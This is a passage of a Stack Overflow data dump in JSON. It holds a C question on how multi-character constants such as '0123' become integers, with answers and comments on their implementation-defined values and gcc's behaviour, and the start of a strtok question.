not looking for atoi which just converts this to present number. For example int x = &#39;1&#39; would print 49 in decimal number system. Now I am interested what would print int x = &#39;0123&#39;. Answer is 6014231063 in octal number system, but how to get that? This is from one programming competition."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1457557945, "post_id": 35902421, "comment_id": 59465746, "body": "Please update your question to indicate more clearly exactly what you&#39;re looking for. Multicharacter constants are already of type <code>int</code>, and have implementation-defined values -- and they&#39;re really not very useful. What integer value do you expect to get from <code>&#39;0123&#39;</code>, and why?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457558070, "post_id": 35902421, "comment_id": 59465819, "body": "Left-shifting certain signed integer values invokes undefined behaviour. right shifting is implementation defined. In total it is a bad idea."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457558122, "post_id": 35902421, "comment_id": 59465845, "body": "And <code>&#39;0123&#39;</code> <b>is</b> an integer already."}, {"owner": {"reputation": 23, "user_id": 6041694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fd5c5c8739b36162519979f1f9aba78?s=128&d=identicon&r=PG&f=1", "display_name": "Prodajem Dom", "link": "https://stackoverflow.com/users/6041694/prodajem-dom"}, "edited": false, "score": 0, "creation_date": 1457558340, "post_id": 35902421, "comment_id": 59465955, "body": "Olaf, I updated question. I am looking what printf is going to print. And why?"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457558440, "post_id": 35902421, "comment_id": 59466015, "body": "@ProdajemDom, no one will tell you why. Such constants are implementation-defined, and you really need to look into some dark corners of documentation to find them (if you are lucky enough!). There is no &#39;why&#39; here, it is simply the fact of life."}], "answers": [{"comments": [{"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 3, "creation_date": 1457557794, "post_id": 35902632, "comment_id": 59465656, "body": "@SteveSummit: Maybe, but it is what the OP <i>asked</i>."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1457558939, "post_id": 35902632, "comment_id": 59466318, "body": "Actually <code>0123</code> is the <i>c-char-sequence</i>. <code>&#39;0123&#39;</code> is a <i>character-constant</i>. (That&#39;s the C terminology; C++ probably uses different terms.) Also, nothing in the standard says that the number of characters in the sequence is limited to <code>sizeof (int)</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1457564378, "post_id": 35902632, "comment_id": 59469105, "body": "@Keith Thompson What I meant to say was that the number of unique values that can be derived certain does not exceed <code>sizeof(int)</code> characters.  IAC, the details of multi-character constant are loose enough to prevent their general portable use: a legacy of C that lives on the same forlorned street as digraphs and tri-graphs. which is next to the dump of <code>=-</code> and <code>foo(...)</code>."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457564879, "post_id": 35902632, "comment_id": 59469302, "body": "It is impossible to use it in portable code since the value is (explicitly) <i>implementation-defined</i> which is non-portable by definition. Digraphs are not forlorn imho; they are simple and usable. Trigraphs are deprecated and may disappear in some future standard."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457565976, "post_id": 35902632, "comment_id": 59469729, "body": "@rici Hmmm,  If <code>char</code> is unsigned or signed  is <i>implementation-defined</i>, yet <code>char</code> used is wide-spread. I-D by itself does not equate to non-portable.  Perhaps posting a &quot;how to use multi-character constant portably&quot; may elicit an acceptable use?"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457566065, "post_id": 35902632, "comment_id": 59469765, "body": "@chux: For that reason, it is impossible to portably use character values outside of the range 0-127. Only non-negative values which could fit into a signed integer can be used <i>portably</i>. So it&#39;s no different."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457566846, "post_id": 35902632, "comment_id": 59470072, "body": "@rici The same line of thought would encumber <code>double</code> to non-portability, given its underlying range, precision and other characteristics are not uniform.  C succeeds because it brings a high level of portability to divergent platforms both archaic and futuristic - not necessarily absolute portability as using  multi-character constant likely prevents."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457567745, "post_id": 35902632, "comment_id": 59470377, "body": "@chux: The standard imposes reasonable minima for precision and range of <code>double</code>. By contrast, it imposes <i>no restrictions whatsoever</i> on multicharacter character literals. An implementation could choose to just use the first character, for example, and some do."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457587008, "post_id": 35902632, "comment_id": 59475951, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/105861/discussion-between-chux-and-rici\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 6, "last_activity_date": 1457559063, "last_edit_date": 1457559063, "creation_date": 1457557625, "answer_id": 35902632, "question_id": 35902421, "link": "https://stackoverflow.com/questions/35902421/how-to-convert-multi-character-constant-to-integer-in-c/35902632#35902632", "title": "How to convert multi-character constant to integer in C?", "body": "<blockquote>\n  <p>How to convert multi-character constant to integer in C?</p>\n</blockquote>\n\n<p><code>'0123'</code> in an <code>int</code>.</p>\n\n<pre><code>int x = '0123'; \n</code></pre>\n\n<hr>\n\n<p><code>'0123'</code> is a <em>character-constant</em>.  In C, this is one of the forms of a constant and it has the type of <code>int</code>.  It is rarely used as its value is implementation-defined. It's usually the following depending on endianness and character codding (e.g. ASCII):</p>\n\n<pre><code>(('0'*256 + '1')*256 + `2`)*256 + '3' = 858927408 = 0x33323130\n(('3'*256 + '2')*256 + `1`)*256 + '0' = 808530483 = 0x30313233\n</code></pre>\n\n<p>Further:  It is a challenge to write useful portable code with it.  Many coding styles bar it when used with more than 1 character.</p>\n"}, {"comments": [{"owner": {"reputation": 6553, "user_id": 3524982, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5NAb1.png?s=128&g=1", "display_name": "James", "link": "https://stackoverflow.com/users/3524982/james"}, "edited": false, "score": 0, "creation_date": 1457557872, "post_id": 35902687, "comment_id": 59465693, "body": "Why go to all that trouble? Why not just use <code>atoi</code>?"}, {"owner": {"reputation": 23, "user_id": 6041694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fd5c5c8739b36162519979f1f9aba78?s=128&d=identicon&r=PG&f=1", "display_name": "Prodajem Dom", "link": "https://stackoverflow.com/users/6041694/prodajem-dom"}, "edited": false, "score": 0, "creation_date": 1457557987, "post_id": 35902687, "comment_id": 59465773, "body": "Hi, I am not looking for atoi, I know how this works. Look into task it is &#39;0123&#39;, not &quot;0123&quot;. It is not string, it is multi-character constant."}, {"owner": {"reputation": 1362, "user_id": 220248, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/682504ea77f2af226b8d17db4d9c80b6?s=128&d=identicon&r=PG", "display_name": "Zepee", "link": "https://stackoverflow.com/users/220248/zepee"}, "edited": false, "score": 0, "creation_date": 1457558026, "post_id": 35902687, "comment_id": 59465797, "body": "Didn&#39;t know such a thing actually existed, but does sound exactly like what OP wants! EDIT: Apparently not what OP wants"}], "tags": [], "owner": {"reputation": 1362, "user_id": 220248, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/682504ea77f2af226b8d17db4d9c80b6?s=128&d=identicon&r=PG", "display_name": "Zepee", "link": "https://stackoverflow.com/users/220248/zepee"}, "is_accepted": false, "score": 0, "last_activity_date": 1457557905, "last_edit_date": 1457557905, "creation_date": 1457557831, "answer_id": 35902687, "question_id": 35902421, "link": "https://stackoverflow.com/questions/35902421/how-to-convert-multi-character-constant-to-integer-in-c/35902687#35902687", "title": "How to convert multi-character constant to integer in C?", "body": "<p>You could try something in the lines of creating a function like this:</p>\n\n<pre><code>int StringLiteralToInt(const char* string, int numbeOfCharacters)\n{\n    int result = 0;\n    for(int ch = 0; ch &lt; numberOfCharacters; ch++)\n    {\n        float powerTen = pow(10, numbeOfCharacters - (ch+1));\n        result += (int)string[ch] * (int)powerTen;\n    }\n    return result;\n}\n</code></pre>\n\n<p>I just wrote that inline, so it might not be 100% right, but it should be the right idea. Just multiply the chars by a power of ten (right most - 10^0, left most - 10^(strinSize-1).</p>\n\n<p>Hope that helps :)</p>\n"}, {"comments": [{"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1457558119, "post_id": 35902726, "comment_id": 59465842, "body": "Well, <a href=\"https://ideone.com/U9urP5\" rel=\"nofollow noreferrer\">this</a> prints 808530483, but I didn&#39;t expected..."}, {"owner": {"reputation": 23, "user_id": 6041694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fd5c5c8739b36162519979f1f9aba78?s=128&d=identicon&r=PG&f=1", "display_name": "Prodajem Dom", "link": "https://stackoverflow.com/users/6041694/prodajem-dom"}, "edited": false, "score": 0, "creation_date": 1457558306, "post_id": 35902726, "comment_id": 59465934, "body": "How did you get 30313233? This is what I am interested in."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457558566, "post_id": 35902726, "comment_id": 59466100, "body": "Downvoting for providing answer very similar to the one which Steve himself downvoted! Fair play."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457558903, "post_id": 35902726, "comment_id": 59466299, "body": "@SergeyA: I was trying to help the OP see how to pick the integer apart, which seemed like what he was trying to do, but he has accepted that other answer, so I guess I was confused.  C&#39;est la vie."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1457563919, "post_id": 35902726, "comment_id": 59468909, "body": "I see useful info here especially the octal part as that was in OP&#39;s post/comment."}], "tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 0, "last_activity_date": 1457564554, "last_edit_date": 1457564554, "creation_date": 1457557977, "answer_id": 35902726, "question_id": 35902421, "link": "https://stackoverflow.com/questions/35902421/how-to-convert-multi-character-constant-to-integer-in-c/35902726#35902726", "title": "How to convert multi-character constant to integer in C?", "body": "<p>Well, you could try this:</p>\n\n<pre><code>int main()\n{ \n    int x = '0123';  \n    printf(\"%x\\n\", x);\n}\n</code></pre>\n\n<p>For me this prints <code>30313233</code>, as I expect.</p>\n\n<p>Here it is broken apart, as it looks like you were trying to do:</p>\n\n<pre><code>    printf(\"%o \", (x &gt;&gt; 24) &amp; 0xff);\n    printf(\"%o \", (x &gt;&gt; 16) &amp; 0xff);\n    printf(\"%o \", (x &gt;&gt; 8) &amp; 0xff);\n    printf(\"%o\\n\", x &amp; 0xff);\n</code></pre>\n\n<p>These printouts show that the multi-character character constant is, in some sense, made up of the characters <code>'0'</code>, <code>'1'</code>, <code>'2'</code>, and <code>'3'</code> all jammed together.  But there is really no sense in which this multi-character character constant has any meaningful relationship to the <em>integer</em> <code>123</code>.  (We could write some code to shift and mask by 8 bits, then subtract <code>'0'</code> to convert from character to digit, then multiply by 10 and add, just like <code>atoi</code>, but it wouldn't really mean anything.)</p>\n"}, {"comments": [{"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1457559432, "post_id": 35902927, "comment_id": 59466604, "body": "Something new to learn every day. Can I ask what are they used for?"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1457559547, "post_id": 35902927, "comment_id": 59466675, "body": "@Bob__: Ideally, nothing. But I&#39;ve seen them used as a kind of human-readable unique number (which works only if the values are actually unique)."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457565414, "post_id": 35902927, "comment_id": 59469528, "body": "Apple used to use them extensively (and maybe still do.) But it wasn&#39;t just Apple who used file and data formats with four-byte tags. You&#39;ll find &quot;tagged&quot; formats all over the place: image formats, font formats, video formats.... Using four ascii characters for the four bytes is a simple way of avoiding the need for huge numbers of symbolic constants."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457566102, "post_id": 35902927, "comment_id": 59469781, "body": "@rici To add detail: .png files use 4-char tags - albeit in a very specified order.  Agree about avoiding the symbolic constants."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1457566360, "post_id": 35902927, "comment_id": 59469877, "body": "@chux: .png is an image format, &#191;no? Although GIF and TIFF files (which came much earlier) are also both tagged formats with four-byte tags."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457568906, "post_id": 35902927, "comment_id": 59470784, "body": "@rici: Yes, png is an image format, and PNG files start with <code>{ 0x89, &#39;P&#39;, &#39;N&#39;, &#39;G&#39; }</code>. I don&#39;t think multi-character constants are going to be useful there."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457569042, "post_id": 35902927, "comment_id": 59470834, "body": "@keithThompson. From the PNG format (<a href=\"https://www.w3.org/TR/PNG/#5Chunk-layout\" rel=\"nofollow noreferrer\">w3.org/TR/PNG/#5Chunk-layout</a>): &quot;Chunk Type: A sequence of four bytes defining the chunk type. Each byte of a chunk type is restricted to the decimal values 65 to 90 and 97 to 122. These correspond to the uppercase and lowercase ISO 646 letters (A-Z and a-z) respectively for convenience in description and examination of PNG datastreams. Encoders and decoders shall treat the chunk types as fixed binary values, not character strings...&quot;"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1457569577, "post_id": 35902927, "comment_id": 59471050, "body": "For comparison, see <a href=\"https://en.wikipedia.org/wiki/OSType\" rel=\"nofollow noreferrer\">Wikipedia on Macintosh OSType</a>, from which I quote: &quot;OSType  is the name of a four-byte sequence commonly used as an identifier in Mac OS. While the bytes can have any value, they usually [use characters, condensed to fit in comment]... FourCC is a system of data format identification used in some platform-independent multimedia containers, such as AIFF and RIFF. It inherits may codes from the OSType. A similar system is also used in TrueType font format.&quot; (I was wrong about TIFFs, though. TIFF tags are only two bytes.)"}], "tags": [], "owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "is_accepted": false, "score": 4, "last_activity_date": 1457559341, "last_edit_date": 1457559341, "creation_date": 1457558697, "answer_id": 35902927, "question_id": 35902421, "link": "https://stackoverflow.com/questions/35902421/how-to-convert-multi-character-constant-to-integer-in-c/35902927#35902927", "title": "How to convert multi-character constant to integer in C?", "body": "<p><code>'0123'</code> is a multi-character constant/literal (C calls it a constant, C++ calls it a literal).  In both languages, it is of type <code>int</code> and has an <em>implementation-defined</em> value.</p>\n\n<p>It's <em>probably</em> typical for <code>'0123'</code> to have the value</p>\n\n<pre><code>('0' &lt;&lt; 24) + ('1' &lt;&lt; 16) + ('2' &lt;&lt; 8) + '3'\n</code></pre>\n\n<p>(assuming <code>CHAR_BIT==8</code>, and keeping in mind that the values of <code>'0'</code> et al are themselves implementation-defined).</p>\n\n<p>Because the value is implementation-defined, multi-character constants are rarely useful, and nearly useless in portable code. The standard doesn't even guarantee that <code>'0123'</code> and <code>'1234'</code> have distinct values.</p>\n\n<p>But to answer your question, <code>'0123'</code> is already of type <code>int</code>, so no conversion is necessary. You can store, manipulate, or print that value in any way you like.</p>\n\n<p>For example, on my system this program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void) {\n    printf(\"0x%x\\n\", (unsigned int)'0123');\n}\n</code></pre>\n\n<p>prints (after a compile-time warning):</p>\n\n<pre><code>0x30313233\n</code></pre>\n\n<p>which is consistent with the formula above -- but the result might differ under another implementation.</p>\n\n<p>The \"implementation-defined\" value means that an implementation is required to document it. gcc's behavior (for version 5.3) is <a href=\"https://gcc.gnu.org/onlinedocs/gcc-5.3.0/cpp/Implementation-defined-behavior.html\" rel=\"nofollow\">documented here</a>:</p>\n\n<blockquote>\n  <p>The preprocessor and compiler interpret character constants in the\n  same way; i.e. escape sequences such as <code>\u2018\\a\u2019</code> are given the values they\n  would have on the target machine.</p>\n  \n  <p>The compiler evaluates a multi-character character constant a\n  character at a time, shifting the previous value left by the number of\n  bits per target character, and then or-ing in the bit-pattern of the\n  new character truncated to the width of a target character. The final\n  bit-pattern is given type <code>int</code>, and is therefore signed, regardless of\n  whether single characters are signed or not (a slight change from\n  versions 3.1 and earlier of GCC). If there are more characters in the\n  constant than would fit in the target int the compiler issues a\n  warning, and the excess leading characters are ignored.</p>\n  \n  <p>For example, <code>'ab'</code> for a target with an 8-bit <code>char</code> would be\n  interpreted as<br>\n  <code>(int) ((unsigned char) 'a' * 256 + (unsigned char)'b')</code>,<br> and\n  <code>'\\234a'</code> as <br><code>(int) ((unsigned char) '\\234' * 256 + (unsigned char) a')</code>.</p>\n</blockquote>\n"}], "owner": {"reputation": 23, "user_id": 6041694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fd5c5c8739b36162519979f1f9aba78?s=128&d=identicon&r=PG&f=1", "display_name": "Prodajem Dom", "link": "https://stackoverflow.com/users/6041694/prodajem-dom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1187, "favorite_count": 1, "accepted_answer_id": 35902632, "answer_count": 4, "score": 1, "last_activity_date": 1457564591, "creation_date": 1457556996, "last_edit_date": 1457564591, "question_id": 35902421, "link": "https://stackoverflow.com/questions/35902421/how-to-convert-multi-character-constant-to-integer-in-c", "title": "How to convert multi-character constant to integer in C?", "body": "<blockquote>\n  <p>How to convert multi-character constant in x to integer? </p>\n</blockquote>\n\n<p>I tried for example <code>'13'</code> as <code>('3' + '1' &lt;&lt; 3)</code>, but it doesn't work properly.\nI don't mean <code>\"0123\"</code>, but <code>'0123'</code>. It compiles, but I don't how did compiler gets the octal result 6014231063 when printing it.  I am not looking for <code>atoi</code> which just converts this to present number. For example <code>int x = '1'</code> would print 49 in decimal number system. Now I am interested what would print <code>int x = '0123'</code>. This task is from programming competition, so the answer shouldn't be unexpected behavior.</p>\n\n<pre><code>int main(void) { \n  int x = '0123';  \n  printf(\"%o\\n\", x);\n  printf(\"%d\\n\", x &gt;&gt; 24);\n  printf(\"%d\\n\", x &lt;&lt; 8 &gt;&gt; 24);\n  printf(\"%d\\n\", x &amp; 0xff);  \n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "strtok", "string-literals"], "comments": [{"owner": {"reputation": 486140, "user_id": 1187415, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/LpTRB.png?s=128&g=1", "display_name": "Martin R", "link": "https://stackoverflow.com/users/1187415/martin-r"}, "edited": false, "score": 4, "creation_date": 1457556981, "post_id": 35902376, "comment_id": 59465215, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/2385697/strtok-giving-segmentation-fault\">strtok giving Segmentation Fault</a>"}, {"owner": {"reputation": 486140, "user_id": 1187415, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/LpTRB.png?s=128&g=1", "display_name": "Martin R", "link": "https://stackoverflow.com/users/1187415/martin-r"}, "edited": false, "score": 0, "creation_date": 1457557112, "post_id": 35902376, "comment_id": 59465282, "body": "Or this one: <a href=\"http://stackoverflow.com/questions/2843236/strtok-program-crashing\" title=\"strtok program crashing\">stackoverflow.com/questions/2843236/strtok-program-crashing</a>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457557123, "post_id": 35902376, "comment_id": 59465292, "body": "This code is awful! Please read a modern C book how to declare a function properly and format source code."}, {"owner": {"reputation": 3273, "user_id": 5021963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/t7Qsr.png?s=128&g=1", "display_name": "Ed de Almeida", "link": "https://stackoverflow.com/users/5021963/ed-de-almeida"}, "edited": false, "score": 0, "creation_date": 1457568392, "post_id": 35902376, "comment_id": 59470601, "body": "I&#39;ve seen many examples of bad code, but this is a serious candidate to the top positions in this ranking. Please, rewrite your question."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 2, "last_activity_date": 1457557328, "last_edit_date": 1457557328, "creation_date": 1457556981, "answer_id": 35902415, "question_id": 35902376, "link": "https://stackoverflow.com/questions/35902376/srtok-is-not-working-in-c/35902415#35902415", "title": "srtok is not working in c", "body": "<p>In your <code>explode()</code> function, you're passing a <em>string 